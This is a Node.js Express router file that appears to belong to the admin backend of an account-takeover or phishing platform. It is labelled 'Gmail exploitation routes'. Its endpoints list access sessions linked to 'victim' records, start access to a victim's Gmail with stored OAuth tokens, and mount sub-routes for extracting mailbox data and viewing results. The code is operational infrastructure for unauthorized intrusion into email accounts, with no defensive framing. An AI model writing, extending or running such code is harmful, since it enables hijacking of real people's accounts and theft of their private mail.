// Gmail exploitation routes aggregator
const express = require('express');
const router = express.Router();
const { PrismaClient } = require('@prisma/client');

const accessRoutes = require('./access');
const extractRoutes = require('./extract');
const resultsRoutes = require('./results');

// Initialize repositories and services
const prisma = new PrismaClient();
const GmailAccessLogRepository = require('../../../../repositories/gmailAccessLogRepository');
const OAuthTokenRepository = require('../../../../repositories/oauthTokenRepository');
const VictimRepository = require('../../../../repositories/victimRepository');
const ActivityLogRepository = require('../../../../repositories/activityLogRepository');
const GmailExploitationService = require('../../../../services/gmailExploitation');
const logger = require('../../../../utils/logger');

const gmailAccessLogRepository = new GmailAccessLogRepository(prisma);
const oauthTokenRepository = new OAuthTokenRepository(prisma);
const victimRepository = new VictimRepository(prisma);
const activityLogRepository = new ActivityLogRepository(prisma);
const gmailExploitationService = new GmailExploitationService(
  gmailAccessLogRepository,
  oauthTokenRepository,
  victimRepository,
  activityLogRepository
);

// GET /api/admin/gmail/sessions - List Gmail access sessions
router.get('/sessions', async (req, res) => {
  try {
    const page = Math.max(parseInt(req.query.page || '1', 10), 1);
    const limit = Math.min(Math.max(parseInt(req.query.limit || '20', 10), 1), 100);
    const skip = (page - 1) * limit;

    const where = {};
    if (req.query.status) {
      where.status = req.query.status;
    }
    if (req.query.victim_id) {
      where.victimId = req.query.victim_id;
    }

    const [sessions, total] = await Promise.all([
      prisma.gmailAccessLog.findMany({
        where,
        skip,
        take: limit,
        orderBy: { createdAt: 'desc' },
        include: {
          admin: { select: { id: true, username: true, email: true } },
          victim: { select: { id: true, email: true, name: true } }
        }
      }),
      prisma.gmailAccessLog.count({ where })
    ]);

    res.status(200).json({
      success: true,
      items: sessions,
      total,
      pages: Math.ceil(total / limit) || 1
    });
  } catch (error) {
    logger.error('Error fetching Gmail access sessions:', error);
    res.status(500).json({
      error: 'Failed to fetch Gmail access sessions',
      message: error.message
    });
  }
});

// GET /api/admin/gmail/sessions/:sessionId - Session detail
router.get('/sessions/:sessionId', async (req, res) => {
  try {
    const session = await prisma.gmailAccessLog.findUnique({
      where: { sessionId: req.params.sessionId },
      include: {
        admin: { select: { id: true, username: true, email: true } },
        victim: { select: { id: true, email: true, name: true } }
      }
    });

    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }

    res.status(200).json({ success: true, data: session });
  } catch (error) {
    logger.error('Error fetching Gmail session detail:', error);
    res.status(500).json({
      error: 'Failed to fetch Gmail session detail',
      message: error.message
    });
  }
});

// POST /api/admin/gmail/access - Initiate Gmail access
router.post('/access', async (req, res) => {
  try {
    const { victimId, adminId, accessMethod = 'oauth_tokens' } = req.body;

    if (!victimId) {
      return res.status(400).json({ error: 'victimId is required' });
    }

    if (!adminId) {
      return res.status(400).json({ error: 'adminId is required' });
    }

    const result = await gmailExploitationService.initiateAccess(
      victimId,
      adminId,
      accessMethod
    );

    // Emit Socket.IO event
    const io = req.app.get('io');
    if (io) {
      io.to('admin').emit('gmail:access-initiated', {
        sessionId: result.sessionId,
        victimId,
        timestamp: new Date().toISOString()
      });
    }

    res.status(200).json({
      success: true,
      sessionId: result.sessionId,
      message: 'Gmail access session initiated successfully'
    });
  } catch (error) {
    logger.error('Error initiating Gmail access:', error);
    res.status(500).json({
      error: 'Failed to initiate Gmail access',
      message: error.message
    });
  }
});

router.use('/access/:session_id', accessRoutes);
router.use('/access/:session_id/extract', extractRoutes);
router.use('/access/:session_id/results', resultsRoutes);

module.exports = router;

